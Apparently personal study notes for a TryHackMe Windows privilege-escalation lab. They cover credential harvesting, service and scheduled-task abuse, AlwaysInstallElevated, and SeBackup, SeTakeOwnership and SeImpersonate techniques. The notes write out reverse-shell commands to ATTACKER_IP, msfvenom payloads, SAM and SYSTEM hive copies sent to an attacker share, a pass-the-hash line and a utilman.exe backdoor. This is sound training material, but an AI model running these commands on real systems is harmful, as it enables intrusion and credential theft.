https://tryhackme.com/room/windowsprivesc20

### Table of contents
- [[#Intro]]
- [[#Passwords Harvesting]]
- [[#Other Quick Wins]]
	- [[#Scheduled Tasks]]
	- [[#AlwaysInstallElevated]]
- [[#Service Misconfigurations]]
	- [[#Windows Services]]
	- [[#Service Executable Permissions]]
	- [[#Unquoted Service Paths]]
	- [[#Service Permissions]]
- [[#Abusing Dangerous Privileges]]
	- [[#SeBackup / SeRestore]]
	- [[#SeTakeOwnership]]
	- [[#SeImpersonate / SeAssignPrimaryToken]]
- [[#Vulnerable Software]]
- 

___
### Intro
[[#Table of contents|Back to the top]]

Users
- **Administrator** (∈ admin group): full access
- **Standard** (∈ users group): limited access

Built-in accounts used by OS
- **SYSTEM / LocalSystem:** perform internal tasks, higher privilege than admin
- **Local Service:** default account to run Windows services with minimum privilege, anonymous connections over network
- **Network Service:** default account to run Windows services with minimum privilege, computer credentials to authenticate through network

___
### Passwords Harvesting
[[#Table of contents|Back to the top]]

**Unattended Windows Installations**
Installing Windows on large number of hosts, deploying single OS image on several hosts, requires admin account --> might be stored
- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

**Powershell History**
Retrieve password as part of command line
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```PowerShell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Save Windows Credentials**
List saved credentials: `cmdkey /list`
Test running powershell with elevated privilege without having password:
```Powershell
runas /savecred /user:admin powershell.exe
```

**IIS Configuration**
Internet Information Services: default web browser on Windows installations
`web.config` stores config of websites and credentials
- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
Find database connection strings: 
```Powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

**PuTTY**
SSH client
```Powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
*Note: Simon Tatham is PuTTY's creator and part of path*

___
### Other Quick Wins
[[#Table of contents|Back to the top]]

#### Scheduled Tasks
Scheduled tasks that's lost its binary or using modifiable binary
**`schtasks`**

```Powershell
schtasks /query /tn vulntask /fo list /v
```
Most important field: `Task To Run` and `Run As User`

**`icacls <Task To Run>`**: check file permission 
--> `BUILTIN\Users:(I)(F)`: **(F)** means full access for us

If the task to run is modifiable we can edit it into any payload we like
```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP ATTACKER_PORT > C:\tasks\schtask.bat
```

#### AlwaysInstallElevated
**`.msi`** (Windows installer files) usually configured to run with privilege of user starting it, but can be configured to run with higher privileges

```Powershell
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Generate malicious .msi with `msfvenom`
```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Run and receive reverse shell
```Powershell
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

___
### Service Misconfigurations

#### Windows Services
[[#Table of contents|Back to the top]]

Managed by SCM (Service Control Manager)
Each service has associated executable run by SCM when started
Service executables have special functions that enables them to communicate with SCM
Service specifies under which user it runs

**`sc qc <service_name>`:** display detailed info about service
**--> `BINARY_PATH_NAME`** 
**--> `SERVICE_START_NAME`:** account used to run service

**DACL** (Discretionary Access Control): who has permission to start, stop, pause, query status, query configuration, reconfigure, ...
**Process Hacker:** display DACL

**`HKLM\SYSTEM\CurrentControlSet\Services\`:** services configurations
--> `ImagePath` // BINARY_PATH_NAME
--> `ObjectName` // SERVICE_START_NAME
--> `Security` --> DACL

#### Service Executable Permissions
[[#Table of contents|Back to the top]]

*Example:* WindowsScheduler

1. `icacls <service_binary>` --> `Everyone: (I)(M)`: (M) "modifiable"

2. On attacker machine, generate exe-service payload:
```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o rev-svc.exe
```

3. Start web server and download on target machine
`python3 -m http.server 8080`
`wget http://ATTACKER_IP:8080/rev-svc.exe -O rev-svc.exe` 

4. Replace executable with payload
`cd <BINARY_PATH_NAME>`
`move <executable>.exe <executable>.exe.bkp`
`move <payload>.exe <executable>.exe`
`icacls <executable>.exe /grant Everyone:F` 

5. Set up listener and restart service
`nc -lvp 4444`
`sc stop windowsscheduler` > `sc start windowsscheduler` 

NB: `sc` is `sc.exe` in Powershell

#### Unquoted Service Paths
Paths have to be quoted to account for spaces

*Example:* "disk sorter enterprise"
When trying to execute `disksrs.exe` with the unquoted path `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`, 
SCM would try to execute `C:\MyPrograms\Disk.exe` with argument 1 `Sorter` and argument 2 `Enterprise\bin\disksrs.exe` because spaces are used as argument separators in terminal, unless quoted

SCM tries to run
1. `C:\MyPrograms\Disk.exe`
2. `C:\MyPrograms\Disk Sorter.exe`
3. `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`
--> attacker can create a payload with the name of 1. or 2. 

>*Most services are installed under `C:\Program Files\` or `C:\Program Files (x86)` which are writable by unprivileged users*
>*Some installers change the permissions on the installed folders*

`icacls c:\MyPrograms` --> `BUILTIN\Users` has **`AD`** and **`WD`** privileges --> create subdirectories and files

Same 2. and 3. as previous section
`icacls C:\MyPrograms\Disk.exe /grant Everyone:F`
`sc stop "disk sorter entreprise` > `sc start "disk sorter enterprise`

#### Service Permissions
[[#Table of contents|Back to the top]]

*Example:* thmservice

If service executable DACL well configured and service binary path rightly quoted, still possible service DACL allow to modify service configuration --> point to executable, run with chosen account
`accesschk64.exe -qlc <service>`: display service DACL
--> examine `BUILTIN\Users` permissions (--> `SERVICE_ALL_ACCESS`)

1. Build, transfer payload and grant full permissions (icacls)

2. Change service's associated executable and account
```Powershell
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

3. Setup listener, restart service

___
### Abusing Dangerous Privileges

#### Windows Privileges

**`whoami /priv`:** check your privileges!
**[Exploitable privileges](https://github.com/gtworek/Priv2Admin)**, [Full list of privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)

#### SeBackup / SeRestore
[[#Table of contents|Back to the top]]

Read/Write any file on system (allow users to perform backups without admin privileges)

**User:** THMBackup
**Password:** CopyMaster555

1. Connect to VM over RDP: `xfreerdp /v:TARGET_IP /u:USERNAME`

2. Execute cmd as admin

3. Backup SAM and SYSTEM hashes
`reg save hklm\system C:\Users\THMBackup\system.hive`
`reg save hklm\sam C:\Users\THMBackup\sam.hive`

4. Create share on attacker machine
`mkdir share`
`python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share`

5. Transfer files on share
`copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\`
`copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\`

6. Retrieve password hashes
`python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL`

7. Pass-the-Hash attack
`python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.82.168.162`

#### SeTakeOwnership
[[#Table of contents|Back to the top]]

Take ownership of any object 

**User:** THMTakeOwnership
**Password:** TheWorldIsMine2022

1. Connect to VM over RDP: `xfreerdp /v:TARGET_IP /u:USERNAME`

2. Execute cmd as admin

3. Take ownership of executable that runs with SYSTEM privileges (here utilman.exe -- Ease of Access utility when screen is locked))
`takeown /f C:\Windows\System32\Utilman.exe`

4. `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`

5. Replace utilman.exe with copy of cmd.exe: `copy cmd.exe utilman.exe`

6. Lock screen (`rundll32.exe user32.dll,LockWorkStation`) and click on Ease of Access button (runs utilman)

#### SeImpersonate / SeAssignPrimaryToken
[[#Table of contents|Back to the top]]

Impersonate other users and act on their behalf

*Example:* FTP server has to impersonate user in ordre to use their access token to access their files

LOCAL SERVICE and NETWORK SERVICE ACCOUNTS have SeImpersonate privilege, IIS create similar default account (`iis apppool\defaultapppool`)

1. Spawn process users can connect to and authenticate
2. Force privileged users to connect and authenticate to it

**RogueWinRM** exploit can accomplish this

In the example, we managed to compromise a website running on IIS and planted a webshell at http://10.82.168.162/

Exploit has been uploaded at `C:\tools\`

Set up listener

Run exploit
```Powershell
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP ATTACKER_PORT"
```

___
### Vulnerable Software
[[#Table of contents|Back to the top]]

#### Unpatched Software
`wmic product get name,version,vendor`
*might not list every program --> check Desktop shortcuts, available services, any trace indicating existence of additional software*

Search for existing exploits (exploit-db)

Powershell script extension: `.ps1`

___
### Other Tools
[[#Table of contents|Back to the top]]

**WinPEAS**
Enumerate target system, uncover privilege escalation paths
`winpeas.exe > outputfile.txt`
[Download](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

**PrivescCheck**
Powershell script, searches for common privilege escalation
`Set-ExecutionPolicy Bypass -Scope process -Force`
`. .\PrivescCheck.ps1`
`Invoke-ProvescCheck`
[Download](https://github.com/itm4n/PrivescCheck)

**WES-NG -- Windows Exploit Suggester - Next Generation**
Runs on attacking machine (doesn't require to upload to target machine, making noise)
`wes.py --update` 
`systeminfo` (on target system)
`wes.py systeminfo.txt`
[Download](https://github.com/bitsadmin/wesng)

**Metasploit**
Meterpreter on target system --> use `multi/recon/local_exploit_suggester`